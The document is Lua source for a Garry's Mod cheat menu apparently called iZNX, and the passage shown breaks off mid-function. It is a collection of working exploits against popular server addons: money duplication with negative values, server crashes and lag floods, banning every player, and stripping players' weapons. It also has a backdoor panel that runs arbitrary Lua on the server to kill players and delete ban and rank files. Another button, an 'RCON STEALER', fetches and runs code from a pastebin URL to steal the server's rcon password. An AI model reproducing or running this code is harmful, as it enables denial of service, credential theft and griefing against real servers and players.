{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent1" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "FarmingmodSellItems" )
net.WriteTable(
{
Cost    =   10,
CropModel    =   "models/props/eryk/garlic.mdl",
CropType =   2,
Info  =   "Garlic Seed",
Model =   "models/props/eryk/seedbag.mdl",
Name    =   "Garlic",
Quality    =   4,
Sell  =   iZNX.GetStored( "montant_argent1" ),
Type  =   "Seed"
}
)
net.WriteInt(1,16)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Point Shop €", {
desc = "Exploit для денег, купим шлюх и кокс ;)",
severity = 3,
scan = function() return iZNX.ValidNetString( "ClickerAddToPoints" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent2" },
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("ClickerAddToPoints")
net.WriteInt(iZNX.GetStored( "montant_argent2" ), 32)
net.SendToServer()
end, },
},
} )
local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1
iZNX.AddExploit( "Body Groups", {
desc = "Изменение скина",
severity = 1,
scan = function() return iZNX.ValidNetString( "bodyman_model_change" ) end,
functions = {
{ typ = "func", name = "Изменить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
PlayerModels = {0,1,2,3,4,5,6}
Torso = {0,1,2,3,4,5,6,7,8,9,10}
Legs = {0,1,2,3,4,5,6}
Hands = {0,1,2}
Glasses = {0,1}
Skins = {0,1,2,3,4,5,6,7,8,9,10}
PM = PM+1
TS = TS+1
LG = LG+1   
HN = HN+1
GL = GL+1
SK = SK+1
if (PM>#PlayerModels) then PM=1 end
if (SK>#Skins) then SK=1 end
if (HN>#Hands) then HN=1 end
if (TS>#Torso) then TS=1 end
if (GL>#Glasses) then GL=1 end
if (LG>#Legs) then LG=1 end
iZNX.NetStart("bodyman_model_change")
net.WriteInt(PlayerModels[PM], 10 )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 1, Torso[TS] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 2, Legs[LG] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 3, Hands[HN] } )
net.SendToServer()
iZNX.NetStart("bodygroups_change")
net.WriteTable( { 4, Glasses[GL] } )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "€ Hitman X €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "SendMoney" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent666" },
{ typ = "players", addr = "l_players_list" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( -iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
hook.Remove( "HUDPaint", "skhdsakjl")
local t = iZNX.GetStored( "l_players_list", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "SendMoney" )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteEntity( v )
net.WriteString( iZNX.GetStored( "montant_argent666" ) )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Bail Out €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "BailOut" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent16" },
{ typ = "players", addr = "l_player_liste" },
{ typ = "func", name = "Дать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( -iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_player_liste", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
iZNX.NetStart( "BailOut" )
net.WriteEntity( LocalPlayer() )
net.WriteEntity( v )
net.WriteFloat( iZNX.GetStored( "montant_argent16" )  )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Tow Truck €", {
desc = "Это перевести я не смог",
severity = 2,
scan = function() return iZNX.ValidNetString( "TOW_SubmitWarning" ) end,
functions = {
{ typ = "func", name = "Spawn МТП", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("TowTruck_CreateTowTruck")
net.SendToServer()
end, },
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent17" },
{ typ = "func", name = "Money Exploit", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
for k,v in pairs(ents.GetAll()) do 
iZNX.NetStart("TOW_SubmitWarning")
net.WriteString(LocalPlayer():SteamID())
net.WriteDouble(-iZNX.GetStored( "montant_argent17" ))
net.WriteEntity(v)
net.SendToServer()
iZNX.NetStart("TOW_PayTheFine")
net.WriteEntity(v)
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "Fire Truck", {
desc = "Спавн Fire Truck",
severity = 1,
scan = function() return iZNX.ValidNetString( "FIRE_CreateFireTruck" ) end,
functions = {
{ typ = "func", name = "Заспавнить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("FIRE_CreateFireTruck")
net.SendToServer()    
end, },
},
} )
iZNX.AddExploit( "€ Hit Menu €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hitcomplete" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent18" },
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
iZNX.NetStart("hitcomplete")
net.WriteDouble(iZNX.GetStored( "montant_argent18" ))               
net.SendToServer()      
end, },
},
} )
iZNX.AddExploit( "€ HHH €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "hhh_request" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local plyhhh = LocalPlayer()              
for k,v in pairs(player.GetAll()) do                
dahater = v   
end        
if dahater != plyhhh then       
local hitRequest = {}
hitRequest.hitman = plyhhh
hitRequest.requester = plyhhh
hitRequest.target = dahater
hitRequest.reward = -9999999
iZNX.NetStart( 'hhh_request' )
net.WriteTable( hitRequest )
net.SendToServer()
else
iZNX.ChatText( "В этой версии HHH невозможно использовать эксплойт !" )    
end
end, },
},
} )
iZNX.AddExploit( "€ DaHit €", {
desc = "Exploit на деньги",
severity = 3,
scan = function() return iZNX.ValidNetString( "DaHit" ) end,
functions = {
{ typ = "float", name = "Сумма", min = "1", max = "100000000", default = "100000", addr = "montant_argent20" },
{ typ = "players", addr = "l_players_listdahit" },
{ typ = "func", name = "Выдать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()  
end  
end, },
{ typ = "func", name = "Забрать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end, },
{ typ = "func", name = "Spam выдача", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_spamdahitprendre" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "Defqon_exploit_spamdahitprendre", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( -iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Defqon_exploit_spamdahitprendre" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
{ typ = "func", name = "Spam забиранием", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_spamdahitenlever" ) then
iZNX.ChatText( "Spam запущен" )
timer.Create( "Defqon_exploit_spamdahitenlever", 1, 0, function()
local t = iZNX.GetStored( "l_players_listdahit", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
hook.Remove( "HUDPaint", "skhdsakjl")
iZNX.NetStart( "DaHit" )               
net.WriteFloat( iZNX.GetStored( "montant_argent20" )  )                            
net.WriteEntity( v )               
net.WriteEntity( v )               
net.WriteEntity( v )               
net.SendToServer()    
end
end)
else
timer.Remove( "Defqon_exploit_spamdahitenlever" )
iZNX.ChatText( "Spam прекращен" )
end
end, },
},
} )
iZNX.AddExploit( "Anti-Printer", {
desc = "Наносите постоянный ущерб принтерам по близости",
severity = 1,
scan = function() return iZNX.ValidNetString( "customprinter_get" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "Defqon_exploit_printersmasher" ) then
iZNX.ChatText( "Anti-Printer запущен" )
timer.Create( "Defqon_exploit_printersmasher", 0, 0, function()
for k, v in pairs( ents.GetAll() ) do
if ( v:GetClass():find("print") && v:GetPos():Distance( LocalPlayer():GetPos() ) <= 750 ) then
iZNX.NetStart("customprinter_get")
net.WriteEntity(v)
net.WriteString("onoff")
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_printersmasher" )
iZNX.ChatText( "Anti-Printer остановлен" )
end
end, },
},
} )
iZNX.AddExploit( "Crash the Server", {
desc = "Краш сервера",
severity = 3,
scan = function() return iZNX.ValidNetString( "textstickers_entdata" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart( "textstickers_entdata" )
net.WriteUInt( 0xFFFFFFF, 32 )
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Free Ammunition", {
desc = "Дает вам боеприпасы для всего вашего оружия",
severity = 1,
scan = function() return iZNX.ValidNetString( "TCBBuyAmmo" ) end,
functions = {
{ typ = "func", name = "Получить", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(GAMEMODE.AmmoTypes) do
iZNX.NetStart("TCBBuyAmmo")
net.WriteTable( {nil,v.ammoType,nil,"0","999999"} )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "€ Advanced Money Printer €", {
desc = "Своровать все деньги из принтеров",
severity = 3,
scan = function() return iZNX.ValidNetString( "DataSend" ) end,
functions = {
{ typ = "func", name = "Своровать", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k, v in pairs( ents.GetAll() ) do
if v:GetClass() == "adv_moneyprinter" then    
iZNX.NetStart("DataSend")
net.WriteFloat(2)
net.WriteEntity(v)
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "gBan Ban everyone", {
desc = "Exploit забанит всех, кроме вас. Был найден в более старой версии gBan",
severity = 3,
scan = function() return iZNX.ValidNetString( "gBan.BanBuffer" ) end,
functions = {
{ typ = "func", name = "Запуск", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k,v in pairs(player.GetAll()) do               
if v != LocalPlayer() then       
iZNX.NetStart( "gBan.BanBuffer" )
net.WriteBool( true )
net.WriteInt( 0, 32 )
net.WriteString( "Poutous everywhere" )
net.WriteString( v:SteamID() )
net.SendToServer()
end
end
end, },
},
} )
iZNX.AddExploit( "Lag Exploit [Юзать only SandBox , ибо DarkRp fix]", {
desc = "Exploit для создания лагов на сервере",
severity = 2,
scan = function() return iZNX.ValidNetString( "StackGhost" ) end,
functions = {
{ typ = "func", name = "Лаги", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_lagsploit7" ) then
iZNX.ChatText( "Запускаем лаги" )
timer.Create( "Defqon_exploit_lagsploit7", 0.015, 0, function()
for i = 1, 8 do
for k,v in pairs( player.GetAll() ) do
iZNX.NetStart( "StackGhost" )
net.WriteInt(69,32)
net.SendToServer()
end
end
end)
else
timer.Remove( "Defqon_exploit_lagsploit7" )
iZNX.ChatText( "Прекращаем лаги" )
end
end, },
},
} )
iZNX.AddExploit( "Reanimation Exploit", {
desc = "Вы автоматически воскресаете после смерти",
severity = 2,
scan = function() return iZNX.ValidNetString( "RevivePlayer" ) end,
functions = {
{ typ = "func", name = "Бессмертие", func = function()
surface.PlaySound("garrysmod/ui_click.html")
if !timer.Exists( "Defqon_exploit_zombie" ) then
iZNX.ChatText( "Ты бессмертен" )
timer.Create( "Defqon_exploit_zombie", 0.5, 0, function()
if !LocalPlayer():Alive() then
iZNX.NetStart("RevivePlayer")
net.WriteEntity(LocalPlayer())
net.SendToServer()
end
end)
else
timer.Remove( "Defqon_exploit_zombie" )
iZNX.ChatText( "Ты снова смертен!" )
end
end, },
},
} )
iZNX.AddExploit( "Armory Robbery", {
desc = "Возьмите оружие из арсенала полиции (вы должны быть рядом с ним) кулдаун 5 минут",
severity = 2,
scan = function() return iZNX.ValidNetString( "ARMORY_RetrieveWeapon" ) end,
functions = {
{ typ = "func", name = "Взять оружие #1", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon1")
net.SendToServer()
end, },
{ typ = "func", name = "Взять оружие #2", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon2")
net.SendToServer()
end, },
{ typ = "func", name = "Взять оружие #3", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("ARMORY_RetrieveWeapon")
net.WriteString("weapon3")
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Admin Stick | Door exploit", {
desc = "Открыть / Закрыть дверь / Удалить владельца (вы должны смотреть на дверь)",
severity = 3,
scan = function() return iZNX.ValidNetString( "fp_as_doorHandler" ) end,
functions = {
{ typ = "func", name = "Открыть", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("unlock")
net.SendToServer()
end, },
{ typ = "func", name = "Закрыть", func = function()
surface.PlaySound("garrysmod/ui_click.html")
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(LocalPlayer():GetEyeTrace().Entity)
net.WriteString("lock")
net.SendToServer()
end, },
{ typ = "func", name = "Удалить владельца", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local door = LocalPlayer():GetEyeTrace().Entity
local doorOwner = door:getDoorData()["owner"]
iZNX.NetStart("fp_as_doorHandler")
net.WriteEntity(door)
net.WriteString("removeOwner")
net.WriteDouble(doorOwner)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Defqon Report Spammer", {
desc = "Report спаммер",
severity = 1,
scan = function() return iZNX.ValidNetString( "TransferReport" ) end,
functions = {
{ typ = "func", name = "Зарепортить всех", func = function()
surface.PlaySound("garrysmod/ui_click.html")
for k, v in pairs( player.GetAll() ) do
iZNX.NetStart( "TransferReport" )
net.WriteString( v:SteamID() )
net.WriteString( "SERVER CODER BY Q" )
net.WriteString( "Bitch please" )
net.SendToServer()
end
end, },
},
} )
iZNX.AddExploit( "SAC Crash", {
desc = "Мгновенный краш сервера, использующего SAC анти-чит",
severity = 3,
scan = function() return iZNX.ValidNetString( "SimplicityAC_aysent" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local tbl = {}
for i=1,400 do
tbl[i] = i
end
iZNX.NetStart("SimplicityAC_aysent")
net.WriteUInt(1, 8)
net.WriteUInt(4294967295, 32)
net.WriteTable(tbl)
net.SendToServer()
end, },
},
} )
iZNX.AddExploit( "Server Crash", {
desc = "Нажмите эту кнопку, чтобы мгновенно крашнуть сервер, на 99.9% не работает",
severity = 3,
scan = function() return iZNX.ValidNetString( "pac_to_contraption" ) end,
functions = {
{ typ = "func", name = "Краш", func = function()
surface.PlaySound("garrysmod/ui_click.html")
local tbl = {}
for i=1,1000000000 do
tbl[#tbl + 1] = i
end
iZNX.NetStart("pac_to_contraption")
net.WriteTable( tbl )
net.SendToServer()
end, },
},
} )
local function nukeweapon( ent )
if !ent:IsValid() then return end
if ent.LNextNuke and ent.LNextNuke > CurTime() then return end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( ent )
net.SendToServer()
ent.LNextNuke = CurTime() + 0.5
end
local function nukeallweapons( tab )
for k, v in pairs( tab ) do
if !v:IsValid() then continue end
if v.LNextNuke and v.LNextNuke > CurTime() then continue end
iZNX.NetStart("properties")
net.WriteString("remove")
net.WriteEntity( v )
net.SendToServer()
end
end
iZNX.AddExploit( "Strip the weapons", {
desc = "Strip оружия у любого игрока.",
severity = 3,
scan = function() return iZNX.ValidNetString( "properties" ) and (!FPP or (FPP and FPP.Settings.FPP_TOOLGUN1.worldprops == 1)) end,
functions = {
--{ typ = "string", name = "Тип оружия", default = "*", addr = "stripper_gunz" },
{ typ = "players", addr = "stripper_plyz" },
{ typ = "func", name = "Стрип", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
if !timer.Exists( "stripclub" ) then
iZNX.ChatText( "Strip запущен" )
timer.Create( "stripclub", 0.5, 0, function()
local t = iZNX.GetStored( "stripper_plyz", {} )
for k, v in pairs( player.GetAll() ) do
if !table.HasValue( t, v ) then continue end
local gunz = v:GetWeapons()
local findstring = iZNX.GetStored( "stripper_gunz", "*" )
if findstring == "*" then nukeallweapons( gunz ) return end
local findstringtab = string.Explode( ", ", findstring )
for _, g in pairs( gunz ) do
for _, s in pairs( findstringtab ) do
if string.find( string.lower( g:GetClass() ), s ) then
nukeweapon( g )
end
end
end
end
end)
else
timer.Remove( "stripclub" )
iZNX.ChatText( "Strip остановлен" )
end
end, },
},
} )



-----------------------------------------------------------------------------------------------------------------------------

function iZNX.MakeFunctionButton( parent, x, y, btext, func, tooltip)
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
if tooltip then TButton:SetToolTip( tooltip ) end
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(100, 100, 100, 245) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
--surface.DrawOutlinedRect( 0, 0, w, h )
end
TButton.DoClick = function()
func()
end
return TButton:GetWide(), TButton:GetTall()
end


function iZNX.HTXBackdoor( parent, x, y, btext )
if !parent:IsValid() then return end
local TButton = vgui.Create( "DButton" )
TButton:SetParent( parent )
TButton:SetPos( x, y )
TButton:SetText( btext )
TButton:SetTextColor( Color(255, 255, 255, 255) )
TButton:SizeToContents()
TButton:SetTall( 24 )
TButton.Paint = function( self, w, h )
surface.SetDrawColor( Color(160, 61, 255, 200) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color( 60, 60, 60 ) )
surface.SetDrawColor( Color( 60, 60, 60 ) )
--surface.SetMaterial( downgrad )
--surface.DrawTexturedRect( 0, 0, w, h/ 2 )
surface.SetDrawColor( Color(100, 100, 100, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.SetDrawColor( Color(110, 70, 70, 255) )
--surface.DrawOutlinedRect( 2, 2, w - 4, h - 4 )
end
TButton.DoClick = function()
iZNX.HTXCommandeListe()
end
return TButton:GetWide(), TButton:GetTall()
end


function iZNX.HTXCommandeListe()
if iZNX.HTXCommandeSelector and iZNX.HTXCommandeSelector:IsVisible() then iZNX.HTXCommandeSelector:Remove() end
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(682,350)
iZNX.HTXCommandeSelector:SetTitle("Backdoor HTX")
iZNX.HTXCommandeSelector:SetPos( 620, 405 )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector:ShowCloseButton( false ) 
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
surface.SetDrawColor( Color(30, 30, 30, 255) )
surface.DrawRect( 0, 0, w, h )
surface.SetDrawColor( Color(55, 55, 55, 255) )
surface.DrawOutlinedRect( 0, 0, w, h )
surface.DrawOutlinedRect( 1, 1, w - 2, h - 2 )
end

local CloseMenu3 = vgui.Create("DButton", iZNX.HTXCommandeSelector )
    CloseMenu3:SetText("<--")
    CloseMenu3:SetSize(200, 200)
    CloseMenu3:SetPos(iZNX.HTXCommandeSelector:GetWide()-120,-85)
    CloseMenu3:SetTextColor(Color(100, 100, 100,245))
    CloseMenu3:SetFont("defqonfont20")
    CloseMenu3.Paint = function( self,w,h ) end
    CloseMenu3.DoClick = function()
        iZNX.HTXCommandeSelector:Remove()

    end 

local DScrollPanel = vgui.Create( "DScrollPanel", iZNX.HTXCommandeSelector )
DScrollPanel:Dock( FILL )
local commandnethtx1 = vgui.Create("DButton", DScrollPanel)
commandnethtx1:SetSize( 652, 20 )
commandnethtx1:SetPos( 2, 175 )
commandnethtx1:SetText("Tuer tous les joueurs")
commandnethtx1:SetTextColor(Color(255, 255, 255, 255))
commandnethtx1.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx1.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx2 = vgui.Create("DButton", DScrollPanel)
commandnethtx2:SetSize( 652, 20 )
commandnethtx2:SetPos( 2, 100 )
commandnethtx2:SetText("Spam Visuel")
commandnethtx2:SetTextColor(Color(255, 255, 255, 255))
commandnethtx2.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(178, 99, 255)
surface.DrawRect(0, 0, w, h)
end
commandnethtx2.DoClick = function()
net.Start(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SendLua([[local hud = vgui.Create(\"HTML\") hud:MoveToFront() hud:SetSize(200,158) hud:SetPos(0,0) hud:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud2 = vgui.Create(\"HTML\") hud2:MoveToFront() hud2:SetSize(200,158) hud2:SetPos(0,ScrH()-158) hud2:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) v:SendLua([[local hud3 = vgui.Create(\"HTML\") hud3:MoveToFront() hud3:SetSize(200,158) hud3:SetPos(ScrW()-200,0) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531246-swag-dance.gif\")]]) v:SendLua([[local hud4 = vgui.Create(\"HTML\") hud4:MoveToFront() hud4:SetSize(200,158) hud4:SetPos(ScrW()-200,ScrH()-158) hud4:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531305-spin.gif\")]]) timer.Create( \"spamsondeouf\", 1, 0, function() v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end) v:SendLua([[hook.Add(\"HUDPaint\",\"c\", function() draw.RoundedBox(0,0,0,ScrW(),ScrH(),Color(math.random(1,255),math.random(1,255),math.random(1,255),155)) end)]]) end BroadcastLua([[hook.Add( \"RenderScreenspaceEffects\", \"ohgod\", function() local sinScaler = math.sin( CurTime() *(RealFrameTime() *1024) ) DrawSharpen( 1 +(sinScaler *10), 0.5 +(sinScaler *2) ) DrawMaterialOverlay( \"effects/tp_eyefx/tpeye\", 1 ) end)]]) BroadcastLua([[timer.Create( \"thedrop\", 0.42, 0, function() util.ScreenShake( LocalPlayer():GetPos(), 512, 5, 0.25, 128 ) end )]]) BroadcastLua([[local hud3 = vgui.Create(\"HTML\") hud3:SetSize(400,300) hud3:SetPos(ScrW()/2-200,ScrH()/2-150) hud3:OpenURL(\"http://image.noelshack.com/fichiers/2017/46/1/1510531253-skel2.gif\")]])" )
net.WriteBit(1)
net.SendToServer()
end



local commandnethtx3 = vgui.Create("DButton", DScrollPanel )
commandnethtx3:SetSize( 652, 20 )
commandnethtx3:SetPos( 2, 375 )
commandnethtx3:SetText("Débannir tout les bannis")
commandnethtx3:SetTextColor(Color(255, 255, 255, 255))
commandnethtx3.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx3.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx4 = vgui.Create("DButton", DScrollPanel )
commandnethtx4:SetSize( 652, 20 )
commandnethtx4:SetPos( 2, 125 )
commandnethtx4:SetText("Ignite tous les joueurs")
commandnethtx4:SetTextColor(Color(255, 255, 255, 255))
commandnethtx4.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx4.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx5 = vgui.Create("DButton", DScrollPanel )
commandnethtx5:SetSize( 652, 20 )
commandnethtx5:SetPos( 2, 150 )
commandnethtx5:SetText("Supprimer les grades")
commandnethtx5:SetTextColor(Color(255, 255, 255, 255))
commandnethtx5.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx5.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx6 = vgui.Create("DButton", DScrollPanel )
commandnethtx6:SetSize( 652, 20 )
commandnethtx6:SetPos( 2, 50 )
commandnethtx6:SetText("RCON STEALER")
commandnethtx6:SetTextColor(Color(255, 255, 255, 255))
commandnethtx6.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx6.DoClick = function()
surface.PlaySound("garrysmod/ui_click.html")
net.Start(thefrenchenculer)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/Ruxg4fFk\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit(1)
net.SendToServer()
timer.Simple( 0.5, function()
if iZNX.ValidNetString( "jeveuttonrconleul" ) then
net.Start("jeveuttonrconleul")
net.SendToServer()
else
chat.AddText( Color(255, 0, 0),"rcon_password не найден, попробуйте еще раз ^^" )
end
end )
end
local commandnethtx7 = vgui.Create("DButton", DScrollPanel)
commandnethtx7:SetSize( 652, 20 )
commandnethtx7:SetPos( 2, 200 )
commandnethtx7:SetText("Screamer")
commandnethtx7:SetTextColor(Color(255, 255, 255, 255))
commandnethtx7.Paint = function(panel, w, h)
surface.SetDrawColor(255, 255, 255 ,255)
surface.DrawOutlinedRect(0, 0, w, h)
surface.SetDrawColor(100, 100, 100 ,245)
surface.DrawRect(0, 0, w, h)
end
commandnethtx7.DoClick = function()
iZNX.NetStart(thefrenchenculer)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit(1)
net.SendToServer()
end
local commandnethtx8 = vgui.Create("DButton", DScrollPanel)
commandnethtx8:SetSize( 652, 20 )
commandnethtx8:SetPos( 2, 225 )
